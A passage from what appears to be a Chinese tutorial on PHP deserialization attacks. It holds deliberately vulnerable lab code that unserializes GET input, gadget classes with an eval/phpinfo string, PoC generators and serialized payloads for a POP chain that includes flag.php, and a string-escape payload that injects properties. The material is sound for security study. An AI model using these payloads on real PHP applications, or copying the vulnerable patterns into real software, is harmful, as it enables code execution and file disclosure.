class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="comment">//    public function __destruct()&#123;  </span></span><br><span class="line"><span class="comment">//        $this-&gt;test-&gt;action();  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//class normal &#123;  </span></span><br><span class="line"><span class="comment">//    public function action()&#123;  </span></span><br><span class="line"><span class="comment">//        echo &quot;please attack me&quot;;  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line"><span class="comment">//&#125;  </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>=<span class="string">&quot;phpinfo();&quot;</span>;  </span><br><span class="line"><span class="comment">//    public function action()&#123;  </span></span><br><span class="line"><span class="comment">//        eval($this-&gt;test2);  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">index</span>();  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>另一种构造方法<br>在类外赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;test2=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;test2=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><h2 id="魔术-POP前置"><a href="#魔术-POP前置" class="headerlink" title="魔术&amp;POP前置"></a>魔术&amp;POP前置</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fast</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wakeup is here!!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;tostring is here!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;benben&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fast</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wakeup is here!!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;tostring is here!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;benben&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972086288-ff1806cb-221e-4720-9be3-e30097a431b8.jpg" alt="null"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;O:3:&quot;sec&quot;:1:&#123;s:6:&quot;benben&quot;;N;&#125;&#x27;</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fast</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span>;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">sec</span>();  </span><br><span class="line"><span class="comment">//给source要一个sec类，因为要调用tostring方法  </span></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fast</span>();  </span><br><span class="line"><span class="variable">$b</span>-&gt;source=<span class="variable">$a</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;fast&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;source&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;sec&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;benben&quot;</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972086420-0547a570-d7b6-4447-a346-f507ae5d93c5.jpg" alt="null"><br>tostring调用成功</p><h2 id="POP链构造-POC的编写"><a href="#POP链构造-POC的编写" class="headerlink" title="POP链构造&amp;POC的编写"></a>POP链构造&amp;POC的编写</h2><p>在反序列化中，我们能控制的数据就是对象中的属性值（成员变量），所以在PHP反序列化中有一种漏洞利用方法叫”面向属性编程”，<br>即PoP(Property Oriented Programming)。<br>POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的，一种payload。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);<span class="comment">//要调用Modifier,才能append</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;<span class="comment">//赋Show类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;<span class="comment">//赋Test类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 访问 Test 对象的 source 属性</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;<span class="comment">//访问一个不存在的属性时，会触发 __get()魔术方法，source属性在Tes类中是不存在的</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//反序列化会自动触发</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;<span class="comment">//给source赋Show类，才能触发toString</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">目标是<span class="keyword">echo</span> <span class="variable">$flag</span></span><br><span class="line">倒推法</span><br><span class="line">需要找<span class="keyword">include</span>(<span class="variable">$value</span>);是哪里的？参数传进来的</span><br><span class="line">value的值=flag.php,才可以输出flag</span><br><span class="line">invoke调用了append，想办法修改<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>为flag.php</span><br><span class="line">当尝试以调用函数的方式调用一个对象时，<span class="title function_ invoke__">__invoke</span>() 方法会被自动调用。</span><br><span class="line">那个地方能够输出呢？</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$function</span>();  <span class="function"><span class="keyword">function</span>(<span class="params"></span>)是一个<span class="title">p</span>，修改<span class="title">p</span></span></span><br><span class="line"><span class="function"><span class="title">p</span>=<span class="title">Modefiler</span>，调用</span></span><br><span class="line"><span class="function">触发<span class="title">get</span>方法才能进行下面的操作</span></span><br><span class="line"><span class="function"><span class="title">get</span>获得一个类的成员变量时调用</span></span><br><span class="line"><span class="function">给$<span class="title">str</span>赋值为对象<span class="title">Test</span>，而<span class="title">Test</span>中不存在成员属性<span class="title">source</span>，则可以触发<span class="title">Test</span>里的成员方法<span class="title">get</span></span></span><br><span class="line"><span class="function"><span class="title">wakeup</span>赋值为对象<span class="title">Show</span>，当<span class="title">echo</span>时会调用<span class="title">toString</span></span></span><br></pre></td></tr></table></figure><p>下面是倒推<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972086528-eff0ee4f-44c3-4c17-8b16-6a52655ba9e7.jpg" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">unserialize() → Show::__wakeup() → echo对象 → Show::__toString() </span><br><span class="line">→ 访问不存在的属性 → Test::__get() → 调用对象作为函数 → Modifier::__invoke() </span><br><span class="line">→ Modifier::append() → include(&#x27;flag.php&#x27;)</span><br><span class="line">Show对象 (source → 引用#1)</span><br><span class="line">    ↓</span><br><span class="line">    source属性 → 指向Show对象自身 (r:1)</span><br><span class="line">    str属性 → Test对象</span><br><span class="line">                ↓</span><br><span class="line">                p属性 → Modifier对象</span><br><span class="line">                            ↓</span><br><span class="line">                            var属性 → &quot;flag.php&quot;</span><br><span class="line">O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:13:&quot; Modifier var&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    private $var=&#x27;flag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;//给source赋Show类，才能触发toString</span><br><span class="line">    public $str;//赋Test类，调用Test对象作为函数触发GET方法</span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;//赋值Modifier类</span><br><span class="line">&#125;</span><br><span class="line">$mod=new Modifier();</span><br><span class="line">$test=new Test();</span><br><span class="line">$test-&gt;p=$mod;</span><br><span class="line">$show=new Show();</span><br><span class="line">$show-&gt;source=$show;</span><br><span class="line">$show-&gt;str=$test;</span><br><span class="line">echo serialize($show);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo urlencode(serialize($show));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="字符串逃逸-字符串减少–基础"><a href="#字符串逃逸-字符串减少–基础" class="headerlink" title="字符串逃逸&amp;字符串减少–基础"></a>字符串逃逸&amp;字符串减少–基础</h2><p>反序列化以;}结束，后面的字符串不影响正常的反序列化</p><p>属性逃逸</p><p>一般在数据先经过一次serialize再经过unserialize,在这个中间反序列化的字符串变多或者变少的时候有可能存在反序列化属性逃逸。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());</span><br><span class="line"><span class="comment">// O:1:&quot;A&quot;:1:&#123;s:2:&quot;v1&quot;;s:1:&quot;a&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:1:&quot;a&quot;;s:2:&quot;v3&quot;;s:3:&quot;ben&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b=&#x27;O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:1:&quot;a&quot;;s:2:&quot;v3&quot;;s:3:&quot;ben&quot;;&#125;&#x27;;</span><br></pre></td></tr></table></figure><p>$b&#x3D;’O:1:”A”:1:{s:2:”v1”;s:1:”a”;s:2:”v3”;s:3:”ben”;}’;</p><p>返回bool(false)<br>不能反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>=<span class="string">&quot;a1&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>=<span class="string">&quot;dazhuang&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v3</span>=<span class="string">&quot;sssss&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());  </span><br><span class="line"><span class="comment">// O:1:&quot;A&quot;:1:&#123;s:2:&quot;v1&quot;;s:1:&quot;a&quot;;&#125;  </span></span><br><span class="line">  </span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:3:&quot;a88&quot;;s:2:&quot;v3&quot;;s:3:&quot;ben&quot;;&#125;&#x27;</span>;  </span><br><span class="line"><span class="comment">//v2从A类获得的</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;a1&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;v2&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;dazhuang&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;v3&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;sssss&quot;</span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>#1 (3) </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$v1</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;a88&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$v2</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;dazhuang&quot;</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$v3</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;ben&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>下面就去逃逸</strong><br>目标：逃逸出来一个v3，值为123</p><p>下面这段代码是不成功的代码<br>因为把system()删掉了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;abcsystem()&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;123&#x27;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());  </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;system()&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$data</span>);<span class="comment">//出现system()就删掉  </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>));<span class="comment">//得到abc  </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972086593-f891c7a8-538d-4f6b-8a05-9d45ef9cfd59.jpg" alt="null"><br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972086660-6cd76ac4-c517-4b69-8d9f-1d7bdc26a3e3.jpg" alt="null"><br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972086726-895a5a8a-925b-4a07-9866-e6b43e84cfcc.jpg" alt="null"></p><p>字符串逃逸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">反序列化字符串减少逃逸，多逃逸出一个成员属性</span><br><span class="line">第一个字符串减少，吃掉有效代码，在第二个字符串构造代码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">反序列化字符串增多逃逸：构造一个逃逸成员属性</span><br><span class="line">第一个字符串增多，吐出多余代码，把多余代码构造成逃逸的成员属性</span><br></pre></td></tr></table></figure><p>双引号是格式符号还是字符串长度3来判断的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b=&#x27;O:1&#x27;</span><br></pre></td></tr></table></figure><p>成员属性数量一致<br>成员属性名称长度一致，内容长度一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:11:&quot;abc&quot;;s:2:&quot;v2&quot;;s:3:&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure><p>修改v2的值形成123的逃逸<br>把前面的值全吃了<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972086793-5899b380-923b-4d4c-aaa3-ddcb0026d3cb.jpg" alt="null"><br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972086886-6ee242ee-1529-4217-a593-e19275f9481c.jpg" alt="null"><br>绿色变成功能性代码</p><p>逃逸代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> = <span class="string">&quot;abcsystem()system()system()&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span> = <span class="string">&#x27;1234567&quot;;s:2:&quot;v3&quot;;s:3:&quot;123&quot;;&#125;&#x27;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>());  